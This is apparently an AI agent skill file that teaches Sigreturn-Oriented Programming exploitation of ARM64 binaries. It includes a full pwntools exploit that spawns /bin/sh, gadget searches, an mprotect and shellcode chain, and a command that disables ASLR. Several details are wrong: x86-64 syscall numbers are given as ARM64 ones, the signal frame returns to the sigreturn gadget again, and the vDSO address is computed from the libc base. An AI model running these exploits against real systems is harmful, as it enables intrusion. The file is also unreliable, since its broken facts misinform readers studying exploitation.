---
name: srop-arm64-exploitation
description: How to perform Sigreturn-Oriented Programming (SROP) attacks on ARM64 binaries. Use this skill whenever the user mentions SROP, sigreturn exploitation, ARM64 binary exploitation, signal frame manipulation, or needs to exploit buffer overflows on AArch64 systems. This skill covers creating vulnerable test binaries, crafting SigreturnFrame payloads, finding sigreturn gadgets automatically, and chaining SROP with ROP for advanced exploitation.
---

# SROP (Sigreturn-Oriented Programming) on ARM64

This skill teaches you how to perform SROP attacks on ARM64 binaries by manipulating signal frames to control register state and execute arbitrary syscalls.

## When to Use This Skill

Use this skill when:
- You need to exploit a buffer overflow on an ARM64 binary
- You want to understand or practice SROP techniques
- You need to craft `SigreturnFrame` payloads with pwntools
- You're looking for `sigreturn` gadgets in binaries or vDSO
- You want to chain SROP with ROP for advanced exploitation
- You're working with ARM64 signal handling vulnerabilities

## Core Concept

SROP abuses the `rt_sigreturn` system call to restore arbitrary register state. By overwriting the return address to point to a `sigreturn` gadget and placing a crafted signal frame on the stack, you can control all general-purpose registers and `pstate`, then execute arbitrary syscalls like `execve`.

## Quick Start: Basic SROP Exploit

### Step 1: Set up the environment

```bash
# Disable ASLR for testing
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Install required tools
pip install pwntools ROPgadget
```

### Step 2: Create a vulnerable test binary

Use the helper script to create a practice binary:

```bash
python3 scripts/create_srop_test_binary.py
```

This creates `srop_test` with a buffer overflow vulnerability.

### Step 3: Write the exploit

```python
from pwn import *

# Setup
p = process('./srop_test')
elf = context.binary = ELF('./srop_test')
libc = ELF("/usr/lib/aarch64-linux-gnu/libc.so.6")

# Find /bin/sh in libc
binsh = next(libc.search(b"/bin/sh"))

# Find sigreturn gadget (mov x8, #0x8b; svc #0)
# 0x8b = __NR_rt_sigreturn
sigreturn_gadget = find_sigreturn_gadget(elf)

# Craft the signal frame
frame = SigreturnFrame()
frame.x8 = constants.SYS_execve  # syscall number for execve (59)
frame.x0 = binsh                 # path to /bin/sh
frame.x1 = 0                     # argv = NULL
frame.x2 = 0                     # envp = NULL
frame.pc = sigreturn_gadget      # return to sigreturn

# Build payload
stack_offset = 72  # Adjust based on your binary
payload = b'A' * stack_offset
payload += p64(sigreturn_gadget)
payload += bytes(frame)

# Send and interact
p.sendline(payload)
p.interactive()
```

## Finding Sigreturn Gadgets

### Method 1: Using ROPgadget

```bash
# Find in a running process
python3 -m ROPGadget --binary /proc/$(pgrep srop_test)/mem --only "svc #0" 2>/dev/null | grep -i sigreturn

# Or use the helper script
python3 scripts/find_sigreturn_gadgets.py ./srop_test
```

### Method 2: Using rp++

```bash
rp++ -f ./binary --unique -r | grep "mov\s\+x8, #0x8b"
```

### Method 3: Check vDSO

The vDSO page often contains a `sigreturn` trampoline at offset `0x7b0`:

```python
# In your exploit
vdso_sigreturn = libc.address + 0x7b0  # May vary by kernel
```

## Advanced: Chaining SROP with ROP

Use SROP to call `mprotect`, then pivot to executable stack:

```python
frame = SigreturnFrame()
frame.x8 = constants.SYS_mprotect  # 226
frame.x0 = 0x400000                # page-aligned address
frame.x1 = 0x2000                  # size
frame.x2 = 7                       # PROT_READ|PROT_WRITE|PROT_EXEC
frame.sp = 0x400000 + 0x100        # new stack pointer
frame.pc = sigreturn_gadget

# Send frame, then send shellcode
p.send(bytes(frame))
p.send(shellcode)
```

## Kernel Validation Considerations

Linux 5.16+ validates signal frames strictly:

- `uc_flags` must contain `UC_FP_XSTATE` when `extra_context` is present
- Reserved words in `struct rt_sigframe` must be zero
- Pointers in `extra_context` must be aligned and in user space

**Solution**: Use `pwntools>=4.10` which crafts compliant frames automatically.

## PAC and BTI Considerations

Modern systems (Android 14+, Fedora 38+) use Pointer Authentication (PAC) and Branch Target Identification (BTI):

- **SROP itself is unaffected** - the kernel overwrites PC directly
- **Subsequent ROP chains** must jump to BTI-enabled instructions
- `sigreturn` trampolines already include correct BTI landing pads

## Common Syscall Numbers (ARM64)

```python
constants.SYS_execve    # 59  - execve
constants.SYS_mprotect  # 226 - mprotect
constants.SYS_read      # 0   - read
constants.SYS_write     # 1   - write
constants.SYS_exit      # 93  - exit
```

## Debugging Tips

1. **Check frame alignment**: ARM64 requires 16-byte stack alignment
2. **Verify gadget addresses**: Use `gdb` to confirm `sigreturn` gadget works
3. **Test with simple syscalls first**: Try `exit` before `execve`
4. **Check kernel version**: `uname -r` - older kernels may have different validation

## References

- [Linux arm64 signal handling documentation](https://docs.kernel.org/arch/arm64/signal.html)
- [LWN – AArch64 branch protection](https://lwn.net/Articles/915041/)
- [pwntools SigreturnFrame documentation](https://docs.pwntools.com/en/stable/tubes.html#sigreturnframe)
